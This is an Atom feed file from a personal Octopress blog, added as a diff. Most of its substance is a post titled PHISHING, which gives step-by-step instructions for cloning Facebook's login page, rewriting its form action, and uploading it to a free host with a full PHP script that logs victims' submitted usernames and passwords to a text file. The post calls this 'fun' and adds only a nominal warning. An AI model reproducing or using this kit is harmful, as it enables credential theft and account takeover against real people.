@@ -1,0 +1,120 @@
+<?xml version="1.0" encoding="utf-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+
+  <title><![CDATA[DECRYPTING IDEAS]]></title>
+  <link href="http://Anjali91.github.io/atom.xml" rel="self"/>
+  <link href="http://Anjali91.github.io/"/>
+  <updated>2013-06-18T17:16:12+05:30</updated>
+  <id>http://Anjali91.github.io/</id>
+  <author>
+    <name><![CDATA[Anjali]]></name>
+    
+  </author>
+  <generator uri="http://octopress.org/">Octopress</generator>
+
+  
+  <entry>
+    <title type="html"><![CDATA[idoit]]></title>
+    <link href="http://Anjali91.github.io/blog/2013/06/18/idoit/"/>
+    <updated>2013-06-18T15:08:00+05:30</updated>
+    <id>http://Anjali91.github.io/blog/2013/06/18/idoit</id>
+    <content type="html"><![CDATA[<p>i am idiotttt</p>
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[diaspora]]></title>
+    <link href="http://Anjali91.github.io/blog/2013/06/01/diaspora/"/>
+    <updated>2013-06-01T19:17:00+05:30</updated>
+    <id>http://Anjali91.github.io/blog/2013/06/01/diaspora</id>
+    <content type="html"><![CDATA[
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[PHISHING]]></title>
+    <link href="http://Anjali91.github.io/blog/2013/05/31/phishing/"/>
+    <updated>2013-05-31T15:50:00+05:30</updated>
+    <id>http://Anjali91.github.io/blog/2013/05/31/phishing</id>
+    <content type="html"><![CDATA[<p>Before we actually start phishing………. here is a brief introduction about what phishing is…</p>
+
+<p>Phishing is a scamming method used to get personal information.. .</p>
+
+<p>i.e. the act of acquiring private or sensitive data from personal computers for use in fraudulent activities.</p>
+
+<p><img src="http://www.hoax-slayer.com/images/phishing-scammer.jpg"></p>
+
+<p>Here are steps to have some fun:&ndash;</p>
+
+<ol>
+<li><p>Open <a href="http://www.facebook.com">http://www.facebook.com</a> on any net browser .</p></li>
+<li><p>Right click on the blank space of the login page, click on ‘view page source’ option.</p></li>
+<li><p>A screen filled with codes will appear.</p></li>
+<li><p>Now press ctrl+a and copy the whole source to notepad.</p></li>
+<li><p>Now press ctrl+f and search for word ‘action’ in the source.</p></li>
+<li><p>Replace the selected text written in quotes with ‘post.php’  inthe above image .</p></li>
+</ol>
+
+
+<p>action=”<a href="https://www.facebook.com/login.php?login_attempt=1&amp;#8243;">https://www.facebook.com/login.php?login_attempt=1&amp;#8243;</a></p>
+
+<p>After replacement :</p>
+
+<p>action=”post.php”</p>
+
+<ol>
+<li><p>Now save the file with ‘.html’ extension. For example : facebook.html</p></li>
+<li><p>Copy paste the following script to notepad, edit the contents of 2nd line in the script</p></li>
+</ol>
+
+
+<p>“header(‘Location:Website to phish’);”</p>
+
+<p>Enter the name of the website you wish to phish , in our case <a href="http://www.facebook.com">http://www.facebook.com</a></p>
+
+<p>After replacement: “header(‘Location: <a href="http://www.facebook.com">http://www.facebook.com</a>);” , and save file with the name ‘post’ and .php extension.</p>
+
+<p>?php
+header (‘Location:Website to Phish’);
+$handle = fopen(“usernames.txt”, “a”);
+foreach($_POST as $variable => $value) {
+   fwrite($handle, $variable);
+   fwrite($handle, “=”);
+   fwrite($handle, $value);
+   fwrite($handle, “\r\n”);
+}
+fwrite($handle, “\r\n”);
+fclose($handle);
+exit;
+?></p>
+
+<ol>
+<li><p>Now register to any free web hosting site. For example : www.my3gb.com</p></li>
+<li><p>Upload the two files created above, one with .html extension(as per our example : facebook.html) and the other post.php</p></li>
+</ol>
+
+
+<p>on your account on free web hosting site.</p>
+
+<ol>
+<li><p>If you register on my3gb.com , to see your uploaded files click on ‘file manager’.</p></li>
+<li><p>Now right click on file with .html extension(facebook.html) that you uploaded shortly, and select “copy link location”. Then paste the link on the address bar in new tab.</p></li>
+<li><p>A page similar to facebook login page will load , but the difference will only be seen in the address bar.</p></li>
+</ol>
+
+
+<p>take a look at the address bar it says “neophytes.my3gb.com/facebook.html”, a genuine facebook page will have “www.facebook.com” in the address bar.</p>
+
+<p>After victim enters his/her username and password , this is what he/she will see.</p>
+
+<p>A new file usernames.txt is created automatically when someone logs on the phishing page you just created. Usernames.txt contains victim’s username and password. You can see the new file usernames.txt by refreshing the page.</p>
+
+<p>P.S. – my3gb.com will delete your account within 24hrs after u try the above phishing….</p>
+
+<p>So the above trick is just for you to see one aspect of Hacking….</p>
+
+<p>Do not use it for malicious purposes.</p>
+]]></content>
+  </entry>
+  
+</feed>
